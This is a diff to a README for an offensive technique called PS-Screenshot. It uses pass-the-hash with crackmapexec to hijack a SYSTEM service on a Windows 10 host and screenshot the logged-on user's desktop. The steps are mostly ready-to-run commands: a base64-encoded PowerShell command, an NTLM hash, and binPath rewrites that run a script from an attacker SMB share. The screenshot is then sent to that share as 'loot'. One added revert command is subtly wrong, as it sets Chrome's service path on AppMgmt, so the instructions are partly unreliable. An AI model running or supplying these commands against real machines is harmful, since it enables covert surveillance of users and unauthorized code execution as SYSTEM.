@@ -1,5 +1,5 @@
 # PS-Screenshot
-Technique to hijack SYSTEM service to grab screenshot of logged on user's desktop
+Technique to hijack SYSTEM service to grab screenshot of logged on user's desktop using token duplication.
 
 This is a pass-the-hash (PTH) procedure for grabbing a screenshot of a remote user's desktop in Windows 10 Pro.  This technique uses crackmap and powershell and assumes that you have already acquired admin credentials (NTLM hash) for the remote computer.
 
@@ -14,7 +14,7 @@ Convert this to a powershell base64 utf-16le encoded command:<br />
 Use crackmap to list services on the target (192.168.1.242) using the base64 output:<br />
 `crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'powershell.exe -EncodedCommand RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAHcAaQBuADMAMgBfAHMAZQByAHYAaQBjAGUAIAB8ACAARgBvAHIAbQBhAHQALQBsAGkAcwB0ACAATgBhAG0AZQAsAEQAaQBzAHAAbABhAHkATgBhAG0AZQAsAFMAdABhAHQAZQAsAFMAdABhAHIAdABNAG8AZABlACwAUwB0AGEAcgB0AE4AYQBtAGUALABQAGEAdABoAE4AYQBtAGUACgA='`<br />
 
-Select a service that is set to manual and is not running (e.g.):<br />
+Select a service that is set to manual, is not running and launches as LocalSystem (e.g.):<br />
 ```
 Name        : AppMgmt
 DisplayName : Application Management
@@ -22,6 +22,16 @@ State       : Stopped
 StartMode   : Manual
 StartName   : LocalSystem
 PathName    : C:\WINDOWS\system32\svchost.exe -k netsvcs -p
+```
+
+Not all services running as LocalSystem will work, you may have to experiment to find one that is not restricted (e.g.):<br />
+```
+Name        : GoogleChromeElevationService
+DisplayName : Google Chrome Elevation Service
+State       : Stopped
+StartMode   : Manual
+StartName   : LocalSystem
+PathName    : "C:\Program Files (x86)\Google\Chrome\Application\74.0.3729.131\elevation_service.exe"
 ```
 
 ## (Step 2) Start your anonymous samba server
@@ -466,12 +476,15 @@ $pngimg.Save($File)
 
 The binPath for the service you identified in step 1 will be changed to run your exploit scripts then it will be reverted back to normal.
 
-(reconfigure the service)<br />
+(reconfigure the service you chose - both example services shown)<br />
 `crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config AppMgmt binPath= "cmd.exe /c start /min /b powershell -ExecutionPolicy Bypass -File \\192.168.1.19\smbdata\launcher.ps1"'`<br />
-(start the service)<br />
+`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config GoogleChromeElevationService binPath= "cmd.exe /c start /min /b powershell -ExecutionPolicy Bypass -File \\192.168.1.19\smbdata\launcher.ps1"'`<br />
+(start the service - both example services shown)<br />
 `crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc start AppMgmt'`<br />
-(revert the binPath on the service)<br />
-`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config AppMgmt binPath= "C:\WINDOWS\system32\svchost.exe -k netsvcs -p"'`
+`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc start GoogleChromeElevationService'`<br />
+(revert the binPath on the service - both example services shown)<br />
+`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config AppMgmt binPath= "C:\WINDOWS\system32\svchost.exe -k netsvcs -p"'`<br />
+`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config AppMgmt binPath= "\"C:\Program Files (x86)\Google\Chrome\Application\74.0.3729.131\elevation_service.exe\""'`
 
 ## (Step 6) Collect your loot
 If everything executed properly and your samba share had guest write access enabled then you should see a PNG graphic file named `screenshot.png` in the upload directory.
